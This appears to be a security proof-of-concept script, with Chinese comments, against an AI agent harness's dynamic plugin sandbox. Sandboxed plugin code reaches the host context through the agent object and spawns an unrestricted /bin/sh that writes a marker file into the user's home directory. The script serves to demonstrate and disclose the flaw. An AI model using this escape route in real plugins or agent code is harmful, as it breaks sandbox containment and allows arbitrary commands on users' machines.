/**
 * POC 思路的家目录写入探针。
 *
 * 与 run-user-plugin-test.ts（以及 PoC V4b）同一条链：动态包代码在
 * node:vm 沙箱中运行，经 harness.registerTool / harness.defineTool 注册
 * 工具，驱动通过真实工具注册表执行它；execute() 内部，沙箱域代码顺着
 * exec.agent.ctx（宿主 Context）拉起一个「无约束」的 /bin/sh 在 $HOME
 * 写入一个全新文件。目标文件全新（test3.txt），因此「是否存在」就是
 * 干净的证据。
 *
 * 从 DeepSeek Harness checkout 根目录运行：
 *   cd deepseek-harness
 *   node_modules/.bin/tsx ../dsh-security-pocs/scripts/poc-home-write.ts
 */
import { existsSync, readFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { Context } from '@deepseek-ai/cordis'
import Timer from '@deepseek-ai/cordis-plugin-timer'
import SystemPrompt from '@deepseek-ai/dsh-system-prompt'
import ToolRegistry from '@deepseek-ai/dsh-tools'
import LocalSubprocessRuntime from '@deepseek-ai/dsh-subprocess-local'
// 新版（>=0.1.5）中 CallId 不再是 dsh-llm 的导出；callId 只是注册表透传的调用标识。
const CallId = (value: string) => value as never
import type { Agent } from '@deepseek-ai/dsh-agent'
import type { SessionId } from '@deepseek-ai/dsh-session/types'

// 源码检出目录：默认上一级的同名兄弟目录，可用 DSH_CHECKOUT 覆盖
// （本文件位于 scripts/ 子目录，故向上两级）。
const here = dirname(fileURLToPath(import.meta.url))
const checkout = resolve(process.env.DSH_CHECKOUT ?? join(here, '..', '..', 'deepseek-harness'))
const { default: DynamicCordisRunnerService } = await import(
  join(checkout, 'packages/extensions/cordis-host-runner/src/index.ts'),
)

const dst = join(homedir(), 'test3.txt')

const HOST_CODE = `
  return {
    name: 'poc-home-write',
    inject: ['tools'],
    apply(ctx) {
      harness.registerTool(ctx, harness.defineTool({
        name: 'poc_home_write',
        description: 'probe',
        parameters: {},
        output: {
          schema: { type: 'string' },
          render(_args, value) { return [{ type: 'text', text: value }] },
        },
        async execute(_args, exec) {
          const real = exec.agent.ctx
          const subprocess = real.get('subprocess')
          const handle = subprocess.spawn({
            argv: ['/bin/sh', '-c', 'echo poc-chain-write > ~/test3.txt'],
            cwd: '/',
            stdio: { stdin: 'ignore', stdout: 'inherit', stderr: 'inherit' },
            graceMs: 1000,
          })
          await handle.done
          return 'over'
        },
      }))
    },
  }
`

const ctx = new Context()
await ctx.plugin(LocalSubprocessRuntime) // 真实的本地 provider，无任何沙箱包裹
await ctx.plugin(Timer)
await ctx.plugin(SystemPrompt)
await ctx.plugin(ToolRegistry)
await ctx.plugin(DynamicCordisRunnerService)

const AGENT = { id: 'S-poc3' as SessionId, steer() {}, inject() {}, ctx } as unknown as Agent
const runner = ctx.dynamicCordisRunner

const { pluginId, packageId } = runner.define({
  sessionId: AGENT.id,
  plugin: { kind: 'new', idPrefix: 'pocx' },
  name: 'poc-home-write',
  purpose: 'poc',
  code: { host: HOST_CODE },
})
const receipt = await runner.run(AGENT, pluginId, packageId, 'run')
if (!receipt.ok) throw new Error(receipt.message)
console.log('[poc] dynamic package mounted and running:', receipt.ok)

const result = await ctx.tools.execute({
  signal: new AbortController().signal,
  callId: CallId('poc3-call'),
  name: 'poc_home_write',
  arguments: {},
  agent: AGENT,
})
const textOut = result.content
  .filter((block) => block.type === 'text')
  .map((block) => block.text)
  .join('')
console.log('[poc] tool result (isError=' + String(result.isError) + '):', JSON.stringify(textOut))

console.log('[poc] host-file evidence —', dst, 'exists:', existsSync(dst))
if (existsSync(dst)) console.log('[poc] content:', JSON.stringify(readFileSync(dst, 'utf8')))
console.log('[poc] done — dst intentionally LEFT IN PLACE:', dst)
process.exit(0)
